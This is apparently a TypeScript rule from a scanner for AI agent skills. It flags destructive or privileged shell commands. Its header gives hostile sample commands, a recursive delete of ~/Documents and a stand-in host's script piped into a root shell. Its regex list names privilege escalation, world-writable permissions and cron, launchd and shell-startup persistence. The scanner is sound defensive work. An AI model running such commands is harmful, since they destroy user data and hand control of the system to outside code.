/**
 * SCRY003 · critical · Destructive or privileged shell.
 *
 * Threat class: OWASP Top 10 for Agentic Applications 2026 — ASI04 Unsafe Tool
 * Use / ASI03 Privilege Abuse. OWASP Agentic Skills Top 10: "Destructive
 * Actions & Persistence". Covers recursive deletes outside the skill, privilege
 * escalation, world-writable perms, piping remote content to a shell, and
 * persistence (cron/launchd/shell-rc).
 *
 * SHOULD catch:
 *   rm -rf ~/Documents
 *   curl https://x.example/install.sh | sudo bash
 * MUST NOT catch (near-miss):
 *   rm -rf ./build            (stays inside the skill directory)
 *   chmod +x ./scripts/run.sh (not world-writable)
 */
import type { Finding } from '../../report/schema.js';
import { escapesSkillDir, tokenize } from '../parsers/shell.js';
import type { Rule, SkillContext } from '../types.js';
import { isScript } from '../types.js';
import { finding, stripComment } from '../util.js';

const DANGEROUS_TARGET = /^(\/|~|\$HOME|\/\*|\*|\.\.)$|^\/\w/;

/** Detect `rm` with recursive+force flags aimed outside the skill directory. */
function recursiveRmEscapes(code: string): boolean {
  const tokens = tokenize(code);
  for (let i = 0; i < tokens.length; i++) {
    const tok = tokens[i] ?? '';
    if (tok !== 'rm' && !tok.endsWith('/rm')) continue;
    let recursive = false;
    let force = false;
    const targets: string[] = [];
    for (const arg of tokens.slice(i + 1)) {
      if (arg.startsWith('--')) {
        if (arg === '--recursive') recursive = true;
        if (arg === '--force') force = true;
      } else if (arg.startsWith('-')) {
        if (arg.includes('r') || arg.includes('R')) recursive = true;
        if (arg.includes('f')) force = true;
      } else {
        targets.push(arg);
      }
    }
    if (!recursive) continue;
    // -rf (or -r alone) aimed at an escaping or root-ish target is the threat.
    const dangerous = targets.some((t) => DANGEROUS_TARGET.test(t) || escapesSkillDir(t));
    if (dangerous && (force || targets.some((t) => DANGEROUS_TARGET.test(t)))) {
      return true;
    }
  }
  return false;
}

interface Pat {
  re: RegExp;
  explanation: string;
  remediation: string;
}

const PATTERNS: Pat[] = [
  {
    re: /(^|[;|&(`]|\$\()\s*sudo\b/,
    explanation: 'Script escalates privileges with sudo.',
    remediation: 'Remove sudo; a skill should never need root.',
  },
  {
    re: /\bchmod\s+(-R\s+|-[A-Za-z]*\s+)*0?777\b/,
    explanation: 'Script makes a path world-writable (chmod 777).',
    remediation: 'Use least-privilege permissions instead of 777.',
  },
  {
    re: /\b(curl|wget)\b[^\n]*\|\s*(sudo\s+)?(ba|z)?sh\b/,
    explanation: 'Remote content is piped directly into a shell (curl | sh).',
    remediation:
      'Download, inspect, and pin the script before running it — never pipe to a shell.',
  },
  {
    re: /\bcrontab\s+(-|\S+)/,
    explanation: 'Script installs a cron job for persistence.',
    remediation: 'Remove the crontab installation.',
  },
  {
    re: /(LaunchAgents|LaunchDaemons)\/|launchctl\s+(load|bootstrap)\b/,
    explanation: 'Script installs a launchd persistence agent.',
    remediation: 'Remove the launchd persistence.',
  },
  {
    re: />>?\s*(~|\$HOME)?\/?\.(bashrc|zshrc|bash_profile|profile|zprofile)\b/,
    explanation: 'Script appends to a shell startup file for persistence.',
    remediation: 'Do not modify the user’s shell startup files.',
  },
  {
    re: /\/(etc\/(cron|systemd|init)|Library\/LaunchAgents)\b/,
    explanation: 'Script writes to a system persistence location.',
    remediation: 'Remove writes to system persistence directories.',
  },
];

export const rule: Rule = {
  id: 'SCRY003',
  severity: 'critical',
  threatClass:
    'OWASP Agentic Apps 2026 ASI04/ASI03 / Agentic Skills Top 10: Destructive Actions & Persistence',
  title: 'Destructive or privileged shell command',

  check(ctx: SkillContext): Finding[] {
    const findings: Finding[] = [];
    for (const file of ctx.files) {
      if (file.isBinary || !isScript(file)) continue;
      for (let i = 0; i < file.lines.length; i++) {
        const code = stripComment(file.lines[i] ?? '');
        const hit = { file, line: i + 1, text: file.lines[i] ?? '' };

        if (recursiveRmEscapes(code)) {
          findings.push(
            finding(
              this,
              hit,
              'Recursive force-delete targets a path outside the skill’s own directory.',
              'Scope deletes to paths inside the skill directory only.',
            ),
          );
        }
        for (const p of PATTERNS) {
          p.re.lastIndex = 0;
          if (p.re.test(code)) {
            findings.push(finding(this, hit, p.explanation, p.remediation));
            break;
          }
        }
      }
    }
    return findings;
  },
};

export default rule;
